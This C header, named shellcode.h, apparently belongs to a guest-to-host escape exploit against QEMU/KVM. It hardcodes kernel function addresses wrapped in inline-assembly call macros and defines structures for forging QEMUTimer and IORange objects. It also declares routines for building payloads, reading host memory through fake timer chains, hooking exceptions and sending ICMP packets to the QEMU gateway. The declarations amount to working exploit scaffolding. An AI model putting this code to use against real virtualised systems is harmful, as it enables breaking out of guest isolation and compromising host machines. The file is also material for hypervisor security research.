#ifndef SHELLCODE_H
#define SHELLCODE_H

#ifndef __KERNEL__
#include <stdint.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/ip_icmp.h>
#define PAGE_SIZE 0x1000
#else
#include <linux/types.h>
#endif //__KERNEL__

#define PUSH_X86_64_CLOBBER() \
  __asm__ __volatile__ (".ascii \"PQRVWAPAQARAS\";":::)
//push a,c,d,si,di,8,9,10,11  

#define POP_X86_64_CLOBBER() \
  __asm__ __volatile__ (".ascii \"A[AZAYAX_^ZYX\";":::)
//pop

#define PUSH_FLAGS() \
  __asm__ __volatile__ ("pushfq;":::)

#define POP_FLAGS() \
  __asm__  __volatile__ ("popfq;":::)

#define print(x) _printk(x)
//#define print(x) do{char joe_buf[] = x;_printk(joe_buf);}while(0)
#define print_int(x) _printk("%i",x)
//do{char joe_buf[] = "%i";_printk(joe_buf, x );}while(0)
#define print_hex(x) _printk("%016lx",x)
//do{char __buf[] = "%016lx";_printk(__buf, x );}while(0)


typedef uint64_t hva_t;
typedef uint64_t gpa_t;
typedef uint64_t gfn_t;
typedef void    *gva_t;

#define QEMU_GATEWAY  0x0202000a //"10.0.2.2"

#define BIOS_CFG_IOPORT 0x510
#define BIOS_CFG_DATAPORT (BIOS_CFG_IOPORT + 1)
#define FW_CFG_WRITE_CHANNEL    0x4000
#define FW_CFG_ARCH_LOCAL       0x8000

#define FW_CFG_E820_TABLE (FW_CFG_ARCH_LOCAL + 3)
#define FW_CFG_HPET (FW_CFG_ARCH_LOCAL + 4)

#define PORT 0xae08


 struct desc_struct {
   unsigned short off_lo, seg_sel;
   unsigned char reserved,flag;
   unsigned short off_hi;
   uint32_t off_higher;
   uint32_t zeros;
   };



struct QEMUClock {
    uint32_t type;
    uint32_t enabled;
};

struct QEMUTimer {
    hva_t clock;
    int64_t expire_time;
#ifdef HAVE_TIMER_SCALE
    int scale;
#endif
    hva_t cb;           /* void (*)(void*) */
    hva_t opaque;       /* void* */
    hva_t next;         /* struct QEMUTimer * */
};

struct IORangeOps {
    /*    void (*read)(IORange *iorange, uint64_t offset, unsigned width,
              uint64_t *data);
          void (*write)(IORange *iorange, uint64_t offset, unsigned width,
              uint64_t data);
    */
    hva_t read;
    hva_t write;
};

struct IORange {
    hva_t ops;
    uint64_t base;
    uint64_t len;
};

struct target_region {
    hva_t hva;
    uint8_t *data;
    size_t len;
    uint16_t entry;
    uint8_t *alloc;
    uint8_t *snapshot;
};

#define X86_64_CLOBBER "%rax", "%rdi", "%rsi", "%rdx", "%rcx", "%r8", "%r9", \
    "%r10", "%r11"
    /*
int sock_create(int family, int type, int protocol, void **res)
{
  __asm__  __volatile__("mov %%rcx,%%r10;":::);
  //  goto *SOCK_CREATE;
}
  //user:   %rdi, %rsi, %rdx, %rcx, %r8 and %r9
  //kernel: %rdi, %rsi, %rdx, %r10, %r8 and %r9.//rcx,r11 clobbered
  */
#define RAW_PCI_READ 0xffffffff81239310
#define RAW_PCI_WRITE 0xffffffff81239380
     //unsigned int domain, unsigned int bus, unsigned int devfn, int reg, int len, u32 *val
  //user:   %rdi, %rsi, %rdx, %rcx, %r8 and %r9
#define raw_pci_read(dom,bus,devfn,reg,len,val)				\
  ({ int __value;							\
    __asm__  ("movl %2, %%edi;"						\
	      "movl %3, %%esi;"						\
	      "movl %4, %%edx;"						\
	      "movl %5, %%ecx;"						\
	      "movl %6, %%r8d;"						\
	      "movq %7,%%r9;"						\
	      "movq %1, %%rax;"						\
	      "callq * %%rax;"						\
	      "movl %%eax,%0;"						\
	      :"=g" (__value)						\
	      :"g" (RAW_PCI_READ),					\
	       "g" (dom), "g" (bus), "g" (devfn),			\
	       "g" (reg), "g" (len), "g" (val)				\
	      :X86_64_CLOBBER);						\
  __value;})    

#define raw_pci_write(dom,bus,devfn,reg,len,val)			\
  ({ int __value;							\
    __asm__  ("movl %2, %%edi;"						\
	      "movl %3, %%esi;"						\
	      "movl %4, %%edx;"						\
	      "movl %5, %%ecx;"						\
	      "movl %6, %%r8d;"						\
	      "movq %7,%%r9;"						\
	      "movq %1, %%rax;"						\
	      "callq * %%rax;"						\
	      "movl %%eax,%0;"						\
	      :"=g" (__value)						\
	      :"g" (RAW_PCI_WRITE),					\
	       "g" (dom), "g" (bus), "g" (devfn),			\
	       "g" (reg), "g" (len), "g" (val)				\
	      :X86_64_CLOBBER);						\
  __value;})    

    
#define SOCK_CREATE 0xffffffff8123b5a0
#define sock_create(family,type,protocol,res)				\
  __asm__  ("movl %1, %%edi;"						\
	    "movl %2, %%esi;"						\
	    "movl %3, %%edx;"						\
	    "movq %4, %%rcx;"						\
	    "movq %0, %%rax;"						\
	    "callq * %%rax;"						\
	    :								\
	    :"g" (SOCK_CREATE),						\
	     "g" (family), "g" (type), "g" (protocol),			\
	     "g" (res)							\
	    :X86_64_CLOBBER)
     //int sock_create(int family, int type, int protocol, void **res);
#define SOCK_SENDMSG 0xffffffff8123aaf0  
#define sock_sendmsg(sock,msg,size)					\
  ({ int __value;							\
    __asm__  ("movq %2, %%rdi;"						\
	      "movq %3, %%rsi;"						\
	      "movl %4, %%edx;"						\
	      "movq %1, %%rax;"						\
	      "callq * %%rax;"						\
	      "movl %%eax,%0;"						\
	      :"=g" (__value)						\
	      :"g" (SOCK_SENDMSG),					\
	       "g" (sock), "g" (msg), "g" (size)			\
	      :X86_64_CLOBBER);						\
    __value;})
     //int sock_sendmsg(void *sock, struct msghdr *msg, size_t size);
    
#define SOCK_RELEASE 0xffffffff8123b2f0  
     /*    void sock_release(void *sock){
      goto *SOCK_RELEASE;
      }*/
#define sock_release(sock)						\
  ({									\
    __asm__  ("movq %1, %%rdi;"						\
	      "movq %0, %%rax;"						\
	      "callq * %%rax;"						\
	      :								\
	      :"g" (SOCK_RELEASE),					\
	       "g" (sock)						\
	      :X86_64_CLOBBER);						})
     //void sock_release(void *sock);

#define PRINTK 0xffffffff81303a25 
int printk(const char *fmt, ...);

#define VIRT_TO_PHYS 0xffffffff8101dea0 //T __phys_addr
/*unsigned long virt_to_phys(unsigned long x){
  goto *VIRT_TO_PHYS;
  }*/
#define virt_to_phys(x)							\
  ({ unsigned long __value;						\
    __asm__  ("movq %2, %%rdi;"						\
	      "movq %1, %%rax;"						\
	      "callq * %%rax;"						\
	      "movq %%rax,%0;"						\
	      :"=g" (__value)						\
	      :"g" (VIRT_TO_PHYS),					\
	       "g" (x)							\
	      :X86_64_CLOBBER);						\
    __value;})
//unsigned long virt_to_phys(unsigned long x);

void entry( void );
inline void setmem(char* addr,char fill,size_t count);
inline void cpymem(char* dest,const char* src,size_t size);
inline void outw(__u16 v, __u16 port);
inline void outl(__u32 v, __u16 port);
inline void* kmalloc(size_t bytes);
inline unsigned char inb( unsigned short port );
inline void outb( unsigned char val , unsigned short port);
unsigned short in_cksum(unsigned short *addr, int len);
int send_icmp_packet(__u32 destination, __u32 icmp_type,
		     __u32 icmp_code,
		     unsigned int icmp_data_size,
		     char *data,
		     __u32 batch_id)			;
void commit_targets(uint64_t *fake_rtc) ;
void refresh_targets(void) ;
void snapshot_targets(void) ;
void rollback_targets(void) ;
void *host_alloc(size_t size) ;
void* obj_alloc(size_t start, size_t last) ;
gpa_t gva_to_gpa(gva_t addr) ;
hva_t gpa_to_hva(gpa_t gpa, hva_t highmem_hva_base) ;
hva_t gva_to_hva(gva_t addr,  hva_t highmem_hva_base ); 
struct QEMUTimer *fake_timer(hva_t cb, hva_t opaque, 
			     struct QEMUTimer *next, hva_t highmem_hva_base) ;
hva_t construct_payload(hva_t highmem_hva_baseu) ;
struct QEMUTimer *construct_read(struct QEMUTimer *timer, hva_t hva, uint32_t **out, hva_t highmem_hva_base) ;
uint64_t read_host8(struct QEMUTimer *head, struct QEMUTimer *chain, 
		    hva_t addr, uint64_t *fake_rtc, hva_t highmem_hva_base);
int _printk(const char *fmt, ...);
void shellcode( void* a );
void* get_targets(void);
void* set_targets(void* ptr);
void grab_excep( int n, const void *new_fn, unsigned long *old_fn);
void* handler(void);
void* do_handler(void);
struct target_region *init_targets(uint8_t *buf);
const void* add_rip (const void* x);
int mprotect(const void *addr, size_t len, int prot);
pid_t fork(void);
int execv(const char *path, char *const argv[]);
char *strcpy(char *dest, const char *src);
#endif
